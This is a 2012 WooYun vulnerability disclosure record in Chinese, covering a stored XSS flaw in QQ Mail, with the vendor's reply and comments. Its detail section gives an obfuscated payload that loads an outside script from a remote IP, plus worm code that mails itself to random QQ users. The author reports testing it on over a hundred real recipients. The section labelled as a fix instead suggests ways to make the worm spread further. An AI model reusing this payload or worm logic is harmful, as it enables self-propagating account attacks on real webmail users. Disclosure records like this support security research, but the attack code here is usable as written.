{"id": 18831, "wybug_id": "wooyun-2012-08158", "wybug_title": "QQ邮箱另一存储型XSS", "wybug_corp": "腾讯", "wybug_author": "shine", "wybug_date": "2012-06-11 09:23", "wybug_open_date": "2012-07-26 09:24", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-26：\t细节向公众公开  简要描述：   主要是对上一个正文的XSS利用详细说明补充一下！ 详细说明：  以下所有测试环境;操作系统：WinXP浏览器：IE6  qq记事本存储型XSS，如图：\n\n处于非编辑器状态也弹了，如图：\n\n   漏洞证明：  补充说明上一个XSS： WooYun: QQ邮箱正文存储型XSS! 由于处于编辑状态，利用起来就很方便：首先在超链接处填充代码加载外部js文件：\n<img/src='http://rescdn.qqmail.com/zh_CN/htmledition/images/logo/logo_0_00aa5cc.gif'><img/src='javascript:{var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,50,50,51,46,52,46,56,46,49,57,48,47,106,115,47,120,115,115,46,106,115);document.body.appendChild(s);}'>http://www.qq.com/送爱心签名传递/<您的签名位置><卢丽丽><李云山>\n外部链接代码：\nvar qqMail;for(m=1;m<=8;m++){//随机填充8个收件人qq邮箱号码qqMail=(\"0000000\" + 100000000 * Math.random()).match(/(\\d{8})(\\.|$)/)[1];if(qqMail.substr(0,1)!='0'){//正则没写好，qq号码是没有“0”开头的QMAddrInput.get('to',window).add(qqMail);}}document.getElementById('sendbtn').click();//调用“发送”按钮点击事件，发送//ps：第8个是我的qq号码，用来做感染用户统计的，在这里改了一下代码！\n如图：\n\n就有传播途径了（代码粗糙了点，但可以说明问题了）！测试发送一百多份邮件，只有一个人点击触发，限制因素太多，不给力啊！   修复方案：     使用获取的当前用户“联系人”列表邮箱号码作为发送号码或使用qq群邮件发送，命中率更高！   版权声明：转载请注明来源 shine@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2012-06-11 11:11 厂商回复： thanks，多谢反馈此问题，经过评估这种风险较低。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-26 10:00 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  厉害呀    \n     2012-07-26 10:58 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  这，风险较低……RANK 1，小气了吧~    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}